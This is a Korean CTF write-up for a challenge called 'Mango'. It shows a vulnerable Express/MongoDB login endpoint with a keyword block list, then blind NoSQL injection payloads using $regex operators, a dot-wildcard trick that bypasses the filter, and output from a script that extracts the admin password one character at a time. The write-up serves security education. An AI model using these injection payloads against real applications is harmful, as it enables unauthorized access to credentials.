# NoSQL-Injection
SQL Injection과 매우 유사한 방식이고, 두 공격 모두 이용자의 입력값이 쿼리에 포함되면서 발생하는 문제점이다. MongoDB의 NoSQL Injection 취약점은 주로 이용자의 입력값에 대한 타입 검증이 불충분할 때 발생한다

# Mango(Exercies)
admin의 계정 비밀번호가 flag 값이다. 아래는 express 프레임워크로 실행 중인 문제 코드이다.

```javascript
const express = require('express');
const app = express();

const mongoose = require('mongoose');
mongoose.connect('mongodb://localhost/main', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;

// filter 함수 ==============================
// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}
// ================================================

app.get('/login', function(req, res) {
    if(filter(req.query)){  // filter  함수가 실행된다
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query;

    db.collection('user').findOne({ // db에서 uid, upw 검색
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});

app.get('/', function(req, res) {
    res.send('/login?uid=guest&upw=guest');
});

app.listen(8000, '0.0.0.0');

```
1. `/login` 페이지 요청시에서는 이용자가 쿼리로 전달한 uid, upw로 데이터에비스를 검색하고 찾아낸 이용자의 정보를 반환한다
2.  filter 함수는 일부 문자열을 필터링하는 함수이다. 필터링 함수는 admin, dh, admi 라는 문자열이 있을 때 true를 반환한다
3. 코드에서 db에서 uid,upw 검색하는 부분을 보면 쿼리 변수의 타입을 검사하지 않는다. 이로 인해서 타입이 string 뿐만아니라 object 타입도 쿼리가 가능하기 때문에 NoSQL Injection 공격이 가능해진다.

# 익스플로잇
`/login?uid=guest&upw=guest`을 입력하면 이용자의 uid만 출력된다. flag 를 얻기 위해선 upw를 획득해야하기 때문에 다음과 같은 방법으로 익스플로잇한다
1. Blind NoSQL Injection Payload 생성 `$regex` 연산을 사용하여 정규표현식을 이용해 데이터를 검색한다.

```
/login?uid=guest&upw[$regex]=.*

guest
```

만약 upw가 일치하는 경우 uid를, 아닌경우 undefined 문자열이 출력되는 것을 통해 참과 거짓을 확인 할 수 있다

2. filter 우회
filter 함수는 admin, dh, admi 문자열을 필터링하지만 정규표현식에서 임의 문자를 표현하는 `.`을 이용하여 쉽게 우회한다

```bash
/login?uid[$regex]=ad.in&upw[$regex]=D.{*

admin
```

3. Exploit Code 작성
이제는 한글자씩 알아내야하므로, 여러번 쿼리를 전달해야하는데 이를 자동화하는 스크립트 코드를 작성하여 실행한다.
코드는 깃허브에 따로 업로드 하였습니다.

# kali linux 에서 코드 작성 후 실행

```
└─$ python3 nosql.py 
FLAG: DH{8}
FLAG: DH{89}
FLAG: DH{89e}
FLAG: DH{89e5}
FLAG: DH{89e50}
FLAG: DH{89e50f}
FLAG: DH{89e50fa}
FLAG: DH{89e50fa6}
FLAG: DH{89e50fa6f}
FLAG: DH{89e50fa6fa}
FLAG: DH{89e50fa6faf}
FLAG: DH{89e50fa6fafe}
FLAG: DH{89e50fa6fafe2}
FLAG: DH{89e50fa6fafe26}
FLAG: DH{89e50fa6fafe260}
FLAG: DH{89e50fa6fafe2604}
FLAG: DH{89e50fa6fafe2604e}
FLAG: DH{89e50fa6fafe2604e3}
FLAG: DH{89e50fa6fafe2604e33}
FLAG: DH{89e50fa6fafe2604e33c}
FLAG: DH{89e50fa6fafe2604e33c0}
FLAG: DH{89e50fa6fafe2604e33c0b}
FLAG: DH{89e50fa6fafe2604e33c0ba}
FLAG: DH{89e50fa6fafe2604e33c0ba0}
FLAG: DH{89e50fa6fafe2604e33c0ba05}
FLAG: DH{89e50fa6fafe2604e33c0ba058}
FLAG: DH{89e50fa6fafe2604e33c0ba0584}
FLAG: DH{89e50fa6fafe2604e33c0ba05843}
FLAG: DH{flag                         }
FLAG: DH{flag                          }
FLAG: DH{flag                           }
FLAG: DH{flag 가리기~~~!!!!!!!!!!!!!!!!!!}
```

위와 같이 코드를 작성하여 실행 시키면 flag 값을 획득 할 수 있다.

